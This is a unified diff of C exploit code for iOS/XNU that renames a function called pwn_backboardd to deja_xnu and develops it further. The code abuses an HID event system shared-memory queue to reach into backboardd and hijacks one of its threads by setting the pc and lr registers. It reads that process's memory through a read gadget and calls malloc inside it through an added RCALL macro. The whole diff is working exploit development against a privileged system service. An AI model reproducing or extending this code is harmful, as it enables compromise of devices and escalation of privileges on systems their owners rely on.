@@ -4,7 +4,7 @@
 #include <mach/mach.h>
 #include "common.h"
 #include "hid.h"
-#include "backboardd.h"
+#include "deja_xnu.h"
 
 #define REGSIZE 8
 
@@ -57,7 +57,7 @@ static kern_return_t thread_wait(thread_t thread, arm_thread_state64_t *state, m
         sched_yield();
         mach_msg_type_number_t cnt = ARM_THREAD_STATE64_COUNT;
         ASSERT_RET("act_get_state", ret = act_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)state, &cnt));
-    } while(state->__pc != pc)
+    } while(state->__pc != pc);
     ASSERT_RET("thread_resume", ret = thread_resume(thread));
 
 out:;
@@ -69,7 +69,7 @@ static kern_return_t thread_read(thread_t thread, arm_thread_state64_t *state, m
     kern_return_t ret = 0;
 
     uint64_t *out = buf;
-    for(size_t i = 0; i < len; += REGSIZE)
+    for(size_t i = 0; i < len; i += REGSIZE)
     {
         state->__x[0] = addr + i;
         state->__pc = read_gadget;
@@ -83,7 +83,7 @@ out:;
     return ret;
 }
 
-mach_port_t pwn_backboardd(void)
+mach_port_t deja_xnu(void)
 {
 #define QUEUE_SIZE 0x8000
     kern_return_t ret = 0;
@@ -97,9 +97,10 @@ mach_port_t pwn_backboardd(void)
                 client  = MACH_PORT_NULL;
     mem_entry_name_port_t object = MACH_PORT_NULL;
     arm_thread_state64_t saved_state = {};
-    mach_vm_address_t addr = 0;
+    mach_vm_address_t shmem = 0,
+                      bbmem = 0;
     mach_vm_address_t sym_malloc          = (mach_vm_address_t)dlsym(RTLD_DEFAULT, "malloc"),
-                      sym_mach_port_names = (mach_vm_address_t)dlsym(RTLD_DEFAULT, "mach_port_names")
+                      sym_mach_port_names = (mach_vm_address_t)dlsym(RTLD_DEFAULT, "mach_port_names"),
                       sym_loader          = (mach_vm_address_t)dlsym(RTLD_DEFAULT, "os_buflet_get_object_address"),
                       sym_ret             = sym_loader + 4;
 
@@ -142,10 +143,10 @@ mach_port_t pwn_backboardd(void)
     ret = io_hideventsystem_queue_create(client, notify, QUEUE_SIZE, &object);
     ASSERT_RET_PORT("io_hideventsystem_queue_create", ret, object);
 
-    ASSERT_RET("mach_vm_map", mach_vm_map(self, &addr, QUEUE_SIZE + 0x1000, 0x0, VM_FLAGS_ANYWHERE, object, 0, 0, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE));
-    LOG("Queue: " ADDR, addr);
+    ASSERT_RET("mach_vm_map", mach_vm_map(self, &shmem, QUEUE_SIZE + 0x1000, 0x0, VM_FLAGS_ANYWHERE, object, 0, 0, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE));
+    LOG("Queue: " ADDR, shmem);
 
-    volatile mach_msg_header_t* shmsg = (volatile mach_msg_header_t*)(addr + QUEUE_SIZE + 0x10);
+    volatile mach_msg_header_t* shmsg = (volatile mach_msg_header_t*)(shmem + QUEUE_SIZE + 0x10);
     shmsg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND);
     shmsg->msgh_local_port = 0x103; // mach_task_self
 
@@ -165,13 +166,32 @@ mach_port_t pwn_backboardd(void)
     ASSERT_RET("act_get_state(saved)", act_get_state(bb_thread, ARM_THREAD_STATE64, (thread_state_t)&saved_state, &cnt));
     arm_thread_state64_t state = saved_state;
 
-    state.x[0] = REGSIZE * 4;
+#define RCALL(th, func) \
+do \
+{ \
+    thread_t _th = (th); \
+    state.__pc = (func); \
+    state.__lr = sym_ret; \
+    ASSERT_RET("thread_go(malloc)", thread_go(_th, &state)); \
+    ASSERT_RET("thread_wait(malloc)", thread_wait(_th, &state, sym_ret)); \
+} while(0)
 
-    ASSERT_RET("thread_go(saved)", thread_go(bb_thread, ));
+    state.__x[0] = REGSIZE * 4;
+    RCALL(bb_thread, sym_malloc);
+    bbmem = state.__x[0];
+    LOG("bbmem: " ADDR, bbmem);
+
+    ASSERT_RET("thread_go(saved)", thread_go(bb_thread, &saved_state));
     mach_port_deallocate(self, bb_thread);
     bb_thread = MACH_PORT_NULL;
 
 
 out:;
+    if(MACH_PORT_VALID(bb_thread))
+    {
+        ASSERT_RET("thread_go(saved)", thread_go(bb_thread, &saved_state));
+        mach_port_deallocate(self, bb_thread);
+        bb_thread = MACH_PORT_NULL;
+    }
     return loc_task; // TODO
 }
